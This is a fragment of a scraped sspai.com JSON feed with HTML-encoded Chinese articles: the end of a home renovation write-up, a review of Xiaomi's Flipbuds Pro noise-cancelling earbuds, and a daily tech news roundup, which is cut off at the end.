src=\"https://cdn.sspai.com/2021/05/28/5b52e1df7bc808a5e097ae6e6a55da50.jpeg\"></figure><p>最后我们考虑用一体式背景墙方案，把两扇门做成和背景一样的颜色，关上房门时能和客厅背景融为一体，降低了视觉上的违和感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/b99a7dd8f4402d87ad0eeabe6fe47ac0.jpeg\"></figure><p>同时还可以搭配一些装饰性的栅栏，让大面积的背板不会过于死板。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/4fc444e65f4310bc04722baf70d469c1.jpeg\"></figure><p>由于一体式的设计和较厚的门板，房间的隔音效果非常好，哪怕是客厅在看电视，也几乎不会打扰到房间内的休息。</p>\n<h4>Apple Fitness+</h4>\n<p>客厅区域在设计的时候也考虑到要做成健身区域，搬开小茶几就可以腾出一片空地放置瑜伽垫进行运动。</p>\n<p>只是当初的设想是有一台 Switch+ 健身环大冒险，到最后变成了 Apple Fitness+。因为它不需要我购买额外的硬件设备，但同样能激励我运动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/11adaaff92b9e53b688598eb0cc0eaee.jpeg\"></figure><p>Apple Fitness+ 的交互设计和视频质量真的很棒，相比于规规矩矩的教学，这种一起运动的氛围更轻松和容易上手，每一位教练都很有感染力。</p>\n<h3>适合聚会聊天的餐厅</h3>\n<p>餐厅的空间主要是和边柜搭配在一起，1 米 4 的餐桌适合多人聚餐，最多可以容纳 8 个人吃饭，吃完饭还可以一起打牌聊天。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/d149c3ee1d8c82b8c2276df50d590dd4.jpeg\"></figure><p>偶尔我也会在这个桌面上看看书写写文章，边柜上有胶囊咖啡机和零食水果，算是一个比较休闲但又可以干正经事的环境。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/c9e499dec2fbaf4f02ae076fa0a40ae0.jpeg\"></figure><p>四个相对独立的空间，能够容纳多人生活休闲，每个人都能找到一个适合自己的理想区域。</p>\n<h2>如果拥有更多收纳空间</h2>\n<h3>定制橱柜</h3>\n<p>在收纳的选择上，我最初对于是否需要有这么多收纳空间持有疑虑，因为如果按照断舍离来生活，也没有那么多东西需要收纳。但过来人的意见是收纳是越多越好的，东西永远都是越积越多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/c54031d76b225f85c3fb5f0377028e25.jpeg\"></figure><p>最终我们还是舍弃一些很有格调的木质柜子，改用全屋定制橱柜。理由其实也挺简单的，我平日里还是喜欢把不常用的东西都收起来，有更多收纳空间也是件好事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/e30b4b2b8d373264d2cdd1a933adec2a.jpeg\"></figure><p>这里我们犯了一个重大的失误，就是冰箱沿用了旧冰箱的小尺寸定做了柜子，住进去之后发现冰箱根本不够容量，想要更换大冰箱的时候，却发现没有修改的空间。有预算的情况下，冰箱还是一步到位挑最大的。后续我们只能在柜子里放置了冷柜来存放一些肉类鱼类库存。</p>\n<h3>榻榻米空间</h3>\n<p>整个房子除了主卧是正经的床外，其余两个都是榻榻米类型的，这样能够拥有更多收纳空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/f762e7eb931752652a3520976fade0b3.jpeg\"></figure><p>榻榻米房间虽然看上去没有那么清爽，但却有极高的实用性，能够很大程度上的解决家居收纳问题，同时还能拥有更多不同的使用场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/05858e333604385d1325c3a9547a536b.jpeg\"></figure><p>长辈房的榻榻米房的床面更大，加上有小一坎小楼梯，很适合在上面玩耍，将来有了小孩之后应该会成为它长期娱乐的空间。似乎小孩子都觉得榻榻米是一样超酷的设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/d3ce3a11de0936a792ad4d71a6618a80.jpeg\"></figure><p>值得注意的是，因为每次打开榻榻米下的收纳柜时，都需要搬开上面的床垫，为了防止整块床垫重量太高，我们选择了三块拼接式的床垫，每个床垫上的套子都可以拆卸下来清洗。每次要拿榻榻米内的物品时，只需要拿起单片床垫即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/5c067b3bcba8a609edebb9bf466aab92.jpeg\"></figure><h3>室外空间</h3>\n<p>除了房间内定制的橱柜和榻榻米收纳外，我们也在室外做了一些收纳空间，主要集中在厕所窗户外的一点空间。</p>\n<p>我们定制了一个超级大的贴护栏，可以架成两层存放一些杂物，日常的除了摆放一些拖把扫把等清洁用品外，也放置了许多收纳箱存放小物件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/048c578b3696b1e1b573c7394aded9e9.jpeg\"></figure><p>我们没有选择在客厅的窗外延伸出防盗网，很多人或许会选择防盗网的方式，进一步增加一些存储空间。但这确实对采光和光景有很大的影响，直接进屋的光线下降一半。</p>\n<p>对于我们来说，阳光比一切都要重要。</p>\n<h2>新家给生活带来的一些减法</h2>\n<p>在选择房子和使用房子这件事上，我们都倾向于去做减法，让生活更简单一点。</p>\n<h3>减少通勤距离</h3>\n<p>买房这件事上我们的考虑最重要的是：尽可能地减少通勤时间，搬进新家之后，我上班骑车 10 分钟，企鹅走路 5 分钟，这是舒适地通勤路程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/d45606370d82c170bd635d7648b956ba.png\"></figure><p>省下来的这些通勤时间，我们可以早起多做一些运动，下班多做点好吃的，你会发现生活的节奏就因为这一点点的时间慢下来。</p>\n<h3>减少重复操作</h3>\n<p>我们在新家里安装了不少智能开关，因为家居环境中大都采用了无主灯的设计，所以灯的开关数量很多，要么密集集中无法快速区分，要么分散各地懒得走动，用语音控制各种灯的开关十分方便迅速。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/5bc556258272614603285b1faedc15bb.png\"></figure><p>智能家居自动执行指令也是一件美好的事情，早上自动关空调，定时打开热水器，自动洗衣服，离开家开启扫地机器人等，都能提升日常规律性操作的体验。</p>\n<h2>家是越住越好的</h2>\n<p>以上就是我在装修新家时候的一些想法和思考，也十分感谢这套房子的设计师我的老爸，他对空间的利用和设计有非常敏锐的感觉。</p>\n<p>从去年 9 月装修到今年 1 月，过年回来后 4 月入住，到现在也就 2 个月不到的时间，我们陆续也有在添加一些东西和调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/37f3bde1eea751ace57614a14eecd9d1.jpeg\"></figure><p>属于自己的家，一定不能也一定不会一次性就做到理想的形态，循序渐进在居住的过程中感受，细细打磨解决一些不顺手不顺眼的地方，持续的投入和折腾，慢慢的这个家才会留下你生活过的痕迹。</p>\n<p>希望这篇文章能够对也想改造旧屋的你有一些启发。</p>\n","link":"https://sspai.com/post/66914"},{"title":"旗舰 TWS 再试水，小米的旗舰主动降噪耳机用起来怎么样？","date":"2021-06-24 03:29:50","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\" target=\"_blank\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>小米 Flipbuds Pro 这款耳机发布时，我义无反顾地冲了首发，但不管我怎么忽悠我的朋友，也没人和我一起冲。</p>\n<p>想想也不奇怪，因为我去年忽悠他们买了 <a href=\"https://sspai.com/post/63371\" target=\"_blank\">小米 Air 2 Pro</a>，从那以后，我就没有朋友了。</p>\n<p>老实说，Air 2 Pro 不是一个太烂的产品，至少在用过 AirPods Pro 和 Enco X 之前，我是这么觉得的。它续航逆天、音质不错，还有当时同价位少见的通透模式；但它同时也容易滑脱、夹脸、不抗风噪、通话收音差......</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/9115b82f86d95e9014582520455ffbcd.jpg\"></figure><p>它有着鲜明的优缺点，但考虑到价位段，它的存在本该是合适的。但小米非要整活，首发大面积翻车的糟糕品控与优化严重不足的半成品固件，让它的口碑彻底爆炸，你能在任何有关这款耳机的地方看到用户对它的无情控诉。</p>\n<p>即使后期通过固件更新，一些首发问题得到了解决，但口碑层面亡羊补牢为时已晚。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/e18957b84b1189a6cfc096083102be50.jpg\"></figure><p>七个月之后，改用歌尔股份 (002241) 代工的小米声学再次试水旗舰 TWS，试图通过「不赚钱交个朋友」的方式挽回口碑，小米这次能成功吗？</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/4481c29dc36b2b4a8784ce382f3e8c3e.jpg\"></figure><p><i>注：本文基于 Flipbuds Pro 固件 7.6.1.13，Xiaomi 11 Pro 固件 12.5.7 编写</i></p>\n<h2>拿来主义的耳机盒</h2>\n<p>这次耳机盒一改 Air 2 Pro 的傻大黑粗磨砂塑料风格，采用了「久经市场验证的成熟方案」。但这并非「抄袭」，它就像鲁迅先生主张的那样：</p>\n<blockquote>\n<p>既非被动地被「送去」，亦非不加分析地「拿来」，而是通过实用主义的观点选择性地「拿来」。</p>\n<p>                                                                                            ——鲁迅《拿来主义》</p>\n</blockquote>\n<p>盒身整体使用了亮面塑料，很耐看、但很不耐磨，不用保护壳很快就会刮花<strong>。</strong>盒盖采用斜切的设计语言，铰链弹力十足，开盖时有强烈的「推指感」，和我的兰博基尼（模型）非常搭。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/de8bd0122547ff81b8f90cc2927267f5.jpg\"></figure><p>盒底有重置按键和 Type-C 接口，你可以用 Type-C 数据线给它有线充电，但充电方式不止于此。行业内售价在 1245-1247 元的 TWS 普遍仅支持有线充电，选配无线充电版还需要加 312 元，而小米非常慷慨地给仅售 799 的 Flipbuds Pro 提供了无线充电。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/24/53198917c4129dd1f320ed69e398e2ee.jpg\"><figcaption>对就是它</figcaption></figure><p>只不过可能因为耳机盒形状圆滑，如果使用手机给 Flipbuds Pro 无线反充，手机线圈会很难与耳机盒对齐，进而出现无线反充中断的现象，这点需要注意。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/93bf5f3e13056a65f0fe5aafa5534f35.jpg\"></figure><p>打开盒盖，耳机居然是反向放置的，这非常反人类。虽然某 1245-1247 元的 TWS 也是反向放置的，但人家耳机柄长，拿出来以后可以用手指一撮就转过来，而 Flipbuds Pro 耳机柄相对短小，单手很难旋转。据说小米也知道这挺反人类的，下一代会改正。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/article/c7b225d7c17e9f77ffaad47c23e0c4a5\" alt=\"小米降噪耳机Pro FlipBuds Pro立即购买-小米商城\"></figure><p>耳机盒可聊的就这么多，咱赶紧看看耳机本体。</p>\n<h2>差强人意的硬实力</h2>\n<p>消费者对降噪耳机最关注的就是音质和降噪表现，但 Flipbuds Pro 在这些方面只能算还行，离行业翘楚还有肉耳可听的距离。</p>\n<p><strong>调音令人失望。</strong></p>\n<p>如果只看频响曲线，Flipbuds Pro 表现还算不错。可能小米研发同学听中文流行歌感觉没什么问题，但我作为听 J-POP 很多的萌二，我的听感与客观数据的优异表现有些相悖，感觉它的低频和高频都欠了一些。现阶段倒是可以通过 <a href=\"https://sspai.com/post/65456\" target=\"_blank\">Wavelet</a> 拉一条 U 型的 EQ 来缓解，但使用第三方应用的缓兵之计不能长久，希望小米可以持续改善调音，或像友商一样在 MIUI 内提供一个系统级自适应 EQ 方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/ece80566aaae9c0ff4ecc7fa6a04b1b1.jpg\"></figure><p><strong>降噪可圈可点。</strong></p>\n<p>Flipbuds Pro 提供了三种降噪模式，分别是「办公」「日常」和「航旅」。这三种模式并非简单代表「弱」「中」「强」，而是针对不同场景的不同降噪方案。小米宣称 Flipbuds Pro 降噪深度可达 40dB，对我来说它的降噪效果确实强于 Air 2 Pro。</p>\n<p>对于三种模式，「日常」确实是最适合大部分场景的模式，「办公」比较鸡肋，「航旅」虽然对发动机噪声消除得更为彻底，但在安静场所中也会让高频的噪音略显突出，这种高频噪音是为了更好的低频降噪的取舍、还是耳机本身产生的底噪，暂且不得而知，因此我只在乘坐交通工具时使用航旅模式。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/bec181723d24b224e36b0d1445517c97.jpg\"></figure><p><strong>抗风噪惨不忍听。</strong></p>\n<p>如果你期望出门也能用降噪，恐怕你得换个选择。虽然 Flipbuds Pro 采用了 L 型导管的设计以避免风直接吹到外 Mic 上，从而达到比 Air 2 Pro 更好的抗风噪效果，但这不过是五十步笑百步，一阵能让旗帜飘起的 3 级微风就会让 Flipbuds Pro 的降噪变得不可用。</p>\n<p>小米原本似乎尝试无视这个问题，奈何用户「不识趣」，骂声太多，遂不得不让步。<a href=\"https://m.weibo.cn/detail/4641432391124450\" target=\"_blank\">@DSPCharles</a> 说，之后的固件更新会以取消「语音热词」功能为代价，上线新的抗风噪算法，那就让我们多给小米一些时间。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/8ff09bb320a851982e1d9f28a2343f36.jpg\"><figcaption>不知道什么时候才会上线</figcaption></figure><p><strong>通透模式欠打磨。</strong></p>\n<p>Flipbuds Pro 的通透模式有两种，其中「人声增强」效果是仅保留人声而减弱其他声音，而「通透模式」是毫无保留地还原外界的声音，虽然效果还不错，但此模式又出现了一些肉耳可闻的高频底噪，长期开启挺难受的，不知道可否更新改善。</p>\n<p>MIUI 在人文关怀方面做了一点小小的贡献，在开发版 21.5.25 之后，小米做了耳机辅助收听的辅助功能，希望能尽快进入稳定版。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/5cc819089d3c0349c0664f534952498a.jpg\"></figure><h2>尚欠火候的软体验</h2>\n<p>有时在互联网上，人们过分强调参数，而往往会忘了除听感外更重要的佩戴、交互、连接等体验，您猜怎么着？Flipbuds Pro 在这些方面也尚欠火候。</p>\n<p><strong>人体工学大飞跃。</strong>这代的运动佩戴稳定性比上一代好很多，刚拿到 Flipbuds Pro 时，我就右耳戴它，左耳 Air 2 Pro 跑了 2km，跑的时候 Air 2 Pro 频频滑脱，而 Flipbuds Pro 一直很稳。</p>\n<p><strong>但稳定的代价是不舒适。</strong>我很少能佩戴这个耳机超过两小时，且每每把它摘下来时我的耳朵都会压着疼，往好处想，或许这是预防中耳炎的措施。有网友说换个第三方耳塞会好很多，于是我就买了个乳胶耳塞确实会好一些，就不打广告了。</p>\n<p>可惜的是，由于我的耳道比较诡异，在面部活动的时候，左耳的 Flipbuds Pro 会滑出来，考虑到每个人的耳道都不一样，希望大家购买之前能去小米之家试戴，尝试挤眉弄眼、原地跳绳，确认稳定性 100% 没问题以后再购买。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/article/7bff19c48a1bf02af8e0de92869b7af1\" alt=\"Xiaomi Flipbuds Pro | Specs, Price, Reviews, and Best Deals\"></figure><p><strong>人机交互还不错。</strong></p>\n<p>这代的交互方案是捏耳机柄，好处是终于可以在床上侧躺着用了，但坏处是按压区没有凹陷，刚上手时不能每次都摸到按压区。按压时会有模拟按键音反馈，但很讨巧的是，反馈音只在入耳时才会播放，这让很多人误以为 Flipbuds Pro 有实体按键。需要吐槽的是，长按耳机超时有些长，切换降噪速度不够快，短按耳机线控操作自定义程度太低，我想要的操作调不出来。期待后续更新解决这些问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/66875571bd184d63f634533f05eef1a6.jpg\"><figcaption>非常有限的线控选项</figcaption></figure><p><strong>续航泯然众人矣。</strong>和 Air 2 Pro 杰出的续航不同，在使用 Flipbuds Pro 时，我会有意识地给它充电，但也不算频繁，可以说是 TWS 平均水平。充电速度也还挺快的，基本上插上电喝杯茶就充满了，所以不存在电量焦虑的问题。如果稍微弱一点的续航是这代更好的人体工学设计导致的，那我完全可以谅解。</p>\n<p><strong>配对体验很惊喜。</strong>虽然在开发版，暗色模式下弹窗动画会闪烁，在稳定版，弹窗动画的电池图标还是旧样式，但这逆转不了我对 Flipbuds Pro 配对体验的高度肯定。Flipbuds Pro 支持通过小米云服务同步耳机信息，因此如果你买了新手机，只需弹开耳机盖，你的新设备就会自动弹窗提示配对。这对于在 Apple 生态圈内的朋友想必不会陌生，小米把这个体验复刻过来了，值得嘉奖。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/5204feee551ded711e1eff584464c2e3.jpg\"></figure><p><strong>低延迟矛盾突出。</strong>Flipbuds Pro 支持 Qualcomm aptX™ Adaptive 协议，可以在芯片支持的手机上以牺牲稳定性（砍 Buffer）的代价换取低延迟的游戏、影音体验。实测低延迟模式的延迟确实低，只有 128ms，相比于普通状态下 400+ms 和 SBC/AAC 下 250+ms 都要好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/04327dd937ea2cfbb31d339dd6b1826b.jpg\"><figcaption>左为低延迟模式，右为普通模式，均为 aptX™ Adaptive</figcaption></figure><p>触发低延迟模式有两种方式：一是 MIUI 白名单的 App，二是将 App 添加进「游戏加速」。游戏低延迟很多高通平台小米手机都支持，而影音低延迟当前仅有 Xiaomi 11 Pro/Ultra 支持。</p>\n<p>其实「影音低延迟」这个功能很令人迷惑，因为 Android 在播放视频时本身就会和 TWS 同步音轨延迟，影音低延迟虽然会让这个同步的过程变得无感，但代价是由于 Buffer Size 变小，复杂无线环境中连接稳定性直接翻车。之前我在用 Xiaomi 11 时因为手机不支持影音低延迟所以无感，一换到 Xiaomi 11 Pro 就疯球了。</p>\n<p>很遗憾的是，影音低延迟和游戏低延迟在支持的设备上是合并的，不支持单独开关，于是我就只能手动操控这个低延迟开关，体验极差。（也不排除是当前版本固件问题）</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/edfe9a0e3bf1f465aad6bcfcf0a76fa7.jpg\"></figure><p>诸位看官可能会问，Flipbuds Pro 有大大小小多如牛毛的问题，为什么我不买成熟靠谱，现价只要一千出头的老大哥——AirPods Pro 呢？一方面原因，我的 EDC 是 MIUI 不是 iOS，要装 App 才能给耳机显示电量我不能接受；另一方面原因，Flipbuds Pro 这次「跨平台双设备连接」的 Feature 把我唬住了。</p>\n<p><strong>双设备连接极为舒适。</strong>虽然开启后，续航和连接稳定性会下降，但在家办公的时候谁管这些呢。开启后，我可以自由选择两个跨平台设备同时连接，一台设备暂停播放，另一台设备的声音就能传入耳机。如果一台设备在播放音乐，另一台设备也想发出声音，此时耳机会发出短提示音，告诉我另一台设备蠢蠢欲动。</p>\n<p>当然这个方案是不完美的，如你所见，它只能在另一台设备发通知音的时候起到作用，如果另一台设备想播放音乐，我只能手动暂停当前设备的音乐，再手动播放另一台设备的音乐。<sup class=\"ss-footnote\" href=\"\" title=\"据说 Redmi AirDots 3 Pro 不用！\" footnote-id=\"1\">1</sup>更极端的情况是，如果你有「手机背单词，电脑放音乐」的需求，那么你不仅听不到手机上的单词发音，还会被非常频繁的耳机提示音打扰，因此在背单词时我一般会关闭一台设备的蓝牙。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/292bb97d3f44043ebe9551b2a9799e55.jpg\"></figure><p>如果你像我一样，是扭曲的 Windows / MIUI / iPadOS 跨平台三设备用户，即便耳机不支持同时三设备连接，你也可以让耳机先和三个设备分别配对，之后只要利用好控制中心，就能比较舒适地在多设备之间遨游了。</p>\n<p>可惜，Windows 10 上控制蓝牙的体验比较尴尬，小米尝试用 MIUI+ 来解决这个问题，但目前这个交互还比较简单初级，对体验改善不大，还有很大的改进空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/dd3d2f04e8ac57cdaa5f0361c56ab6fd.jpg\"><figcaption>MIUI+ 无线耳机面板</figcaption></figure><p>差不多了，该写评语了。</p>\n<h2>结语</h2>\n<p>写到这里，我惊讶地发现我对这款耳机的褒奖基本集中于连接性部分。而不说友商，小米自己新出的 Redmi AirDots 3 Pro 在连接性上的配置都和这款耳机如出一辙：它们都支持双设备连接，都支持小米云服务，都支持游戏低延迟，甚至 Redmi 耳机配合 K40 游戏增强版的延迟还更低。而 Flipbuds Pro 虽然加了更贵的芯片，用了更花钱的工艺，有了更高端的设计，但这些物料上的差价反映在产品本身的提升实在是有些尴尬。</p>\n<p>是，Flipbuds Pro 的降噪比 Redmi 更好，但降噪相当、短板更少的 AirPods Pro 现在加一点钱就能买到，自家的 Redmi AirDots 3 Pro 即便降噪没有那么好，奈何它便宜，在多数场景下适当利用「掩蔽效应」，放一点轻音乐来遮盖噪音，也能有不错的主动降噪体验......</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/22/article/4f75429dc70da26592514ad48628f3db\" alt=\"Redmi AirDots 3 Pro立即购买-小米商城\"><figcaption>Redmi AirDots 3 Pro</figcaption></figure><p>这让我不禁想问，Flipbuds Pro 有存在的必要吗？</p>\n<p>有。</p>\n<p>开篇已叙，小米急切地需要一款新耳机来挽回被 Air 2 Pro 砸烂的口碑。Flipbuds Pro 虽不完美，大小问题很多，<strong>但这是一款能站上中高端 TWS 市场的主动降噪耳机。</strong>无论从我的体验，还是从网上的反馈来看，它「拯救小米声学」的使命已经达到了。</p>\n<p>它的定位看似有些尴尬，处在「上不去下不来」的段位，但从另一个角度来说，它 799 的定价对原价 699 的 Air 2 Pro 针对性十足，仿佛就是在告诉用户：「去年我错了，今年我重新做人了，请给我第二次机会。」基于这个思路，Flipbuds Pro 略显尴尬的定价也就可以解释了。</p>\n<p>但倘若不分析历史因素，只从产品的角度来说，<strong>至少在小米把抗风噪的问题解决之前，Flipbuds Pro 不算是一个很好的产品。</strong></p>\n<p>对于普通消费者的购买建议，如上所述，如果在小米生态圈，Redmi AirDots 3 Pro 可能是性价比更高的选择，如果不在，那么不管是 Apple AirPods Pro 还是索尼 WF-1000XM4 都更能让你满意。Flipbuds Pro 也许只有像我一样的全肯定粮友，或者是坐飞机很多的粮系 KOL 才会中意。它的佩戴感，以及在当前固件下从调音到抗风噪的那些不完美，对于它这个也不算便宜的价位来说，很难让普通消费者全盘接受。</p>\n<p>写了很多不好听的话，因为我由衷希望小米声学部门能支楞起来，少吹牛多做事，把眼前的问题解决了，再放眼星辰大海。</p>\n<p>革命尚未成功，同志仍需努力。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66851"},{"title":"派早报：苹果将开放 15W MagSafe 认证、奥迪将停止生产燃油车等","date":"2021-06-24 00:40:18","description":"\n<h2>Apple 将开放 15W MagSafe 充电配件认证</h2>\n<p>Apple 公司宣布，将开放第三方配件的 15W MagSafe 无线充电模块认证，所有获得 MFi 认证的品牌均可提交申请，并从 Apple 授权经销商处获取 MagSafe 模块样品。内置 MagSafe 模块且经过认证的第三方配件将可以使用「Made for MagSafe」徽章，以提升消费者的认可度。<a href=\"https://mp.weixin.qq.com/s/3gzq9JI11wtoDhjVkj970g\" target=\"_blank\">来源</a></p>\n<h2>三星新款智能手表渲染图流出</h2>\n<p>近日，知名爆料人 OnLeaks 与 GizNext 联合放出了三星智能手表新品 Galaxy Watch Active 4 的渲染图，图中的三星新款手表没有圆形表冠，只有两个侧边按钮。Galaxy Watch Active 4 可能是三星将 Tizen 和 Wear OS 合并后的首款产品，预计将于本月底的三星新品发布会上正式亮相。<a href=\"https://www.theverge.com/2021/6/23/22546997/samsung-galaxy-watch-active-4-renders-leak-tizen-wear-os-smartwatch\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/d315e9b9d3bab2977f3137cd7f0abde3.png\"><figcaption>Galaxy Watch Active 4，图片来自新闻源</figcaption></figure><h2>Kopin 推出全球首款超高亮度 OLED 微型显示器</h2>\n<p>6 月 22 日，Kopin 公司宣布生产出全球首款亮度高达 35,000 尼特的 HDR 绿色 OLED 硅基微型显示器，该产品采用了双堆叠 OLED 结构以此实现超高亮度，同时也提供更高的电流效率和更长的寿命，专为高性能的 AR 产品设计。<a href=\"https://finance.yahoo.com/news/kopin-corporation-produces-world-first-123000834.html?guccounter=2&amp;guce_referrer=aHR0cHM6Ly9zc3BhaW1lLmZlaXNodS5jbi8&amp;guce_referrer_sig=AQAAAFIVklBXF0tNXfPu4aSXXQ7XCf8_nEUO3ePCaIaxCwKu7HkUBGX9L6k3wJlN6C8J0aVWeNUn8iuHMAU-7-JywsdQpAbM6XERHOj2UrDB6Tdy1HlWSXP17LmhIskTnWKNtDAO4S98gcy6EogB50bLzu36N8iea2c8CPjEFIguaDA6\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/article/8d7ee31f982fec175382871ba4c14541\"><figcaption>Kopin 超高亮度显示器，图片来自新闻源</figcaption></figure><h2>GoPro 推出 Open GoPro API，支持第三方应用控制相机</h2>\n<p>GoPro 于 6 月 23 日正式推出名为 Open GoPro API 的第三方接口，支持第三方应用将 GoPro HERO9 Black 相机接入其 app 中，目前已经接入该 API 的设备和应用包括华米智能手表、Centurion Boats 竞技快艇、OrqaFPV 无人机飞行眼镜、Pixellot 运动直播以及 Sena 蓝牙设备等。<a href=\"https://www.pingwest.com/w/244814?utm_source=feed\" target=\"_blank\">来源</a></p>\n<h2>Apple 搜索广告业务已在中国大陆推出</h2>\n<p>Apple Search Ads（简称「ASA」，即「苹果搜索广告」）业务已经开放创建中国大陆地区的竞价计划。该业务将会在用户搜索 app 时展示广告位，帮助开发者完成产品推广并增加转化。<a href=\"https://www.donews.com/news/detail/1/3157953.html\" target=\"_blank\">来源</a></p>\n<h2>AMD 将不再发布针对 Windows 7 的驱动更新</h2>\n<p>AMD 公司于近期决定，将停止对老版本 Windows 系统的驱动更新，其中包含 Windows 7 及 Windows 8.1，这意味着未来只有使用 Windows 10 及更高版本操作系统的 AMD 用户才能获得新版驱动。<a href=\"https://news.softpedia.com/news/amd-to-no-longer-release-new-windows-7-driver-updates-533316.shtml\" target=\"_blank\">来源</a></p>\n<h2>特斯拉光储充一体化超充站于拉萨落成</h2>\n<p>6 月 23 日，电动汽车品牌特斯拉旗下的中国光储充一体化超级充电站在拉萨正式落成。该充电站将完全使用太阳能进行电力存储与供应。拉萨全年平均日照时长超过 3000 小时，海拔超过 3600 米，太阳能资源十分丰富。<a href=\"https://weibo.com/3615027564/KlutrF4Ia\" target=\"_blank\">来源</a></p>\n<h2>奥迪公司宣布将于 2033 年停产燃油车</h2>\n<p>6 月 22 日，奥迪汽车公司对外宣布称，奥迪将从 2026 年开始只在全球市场发布纯电动车型并逐步停产燃油车，以加速电动化的布局。到 2033 年以后，奥迪燃油车将完全停产。不过，该政策的应用范围不包括中国市场，奥迪方面认为，中国市场仍存在燃油车需求，2033 年以后在中国销售的燃油车将进行本地化生产。<a href=\"https://www.donews.com/news/detail/7/3158144.html\" target=\"_blank\">来源</a></p>\n<h2>Steam 转区冷却期或已延长至三个月</h2>\n<p>游戏社区其乐网的玩家于近期发现，Steam 游戏平台调整了转区冷却期，该期限从之前的两周延长至三个月。Steam 此前已经多次调整转区政策，防止玩家为了利用不同地区游戏定价差异而频繁换区。<a href=\"https://keylol.com/t725910-1-1\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>🚢 <a href=\"https://sspai.com/post/66924\" target=\"_blank\">温柔岁月，沪宁记忆 02：南京篇</a>\n</li>\n<li>🏠 <a href=\"https://sspai.com/post/67379\" target=\"_blank\">不买可以先收藏 06：筛选房源的第一步，读懂户型图</a>\n</li>\n<li>🤖️ <a href=\"https://sspai.com/post/67370\" target=\"_blank\">Refresh 周报：本周值得关注的泛 Android 资讯</a>\n</li>\n<li>🎙️ <a href=\"https://sspai.com/post/67303\" target=\"_blank\">2021 年最适合你的翻译 App 是什么？你可能需要这份指南</a>\n</li>\n<li>💡 <a href=\"https://sspai.com/post/67376\" target=\"_blank\">让人人都能表达创意的专业课程：Today at Apple 创想营开学了</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 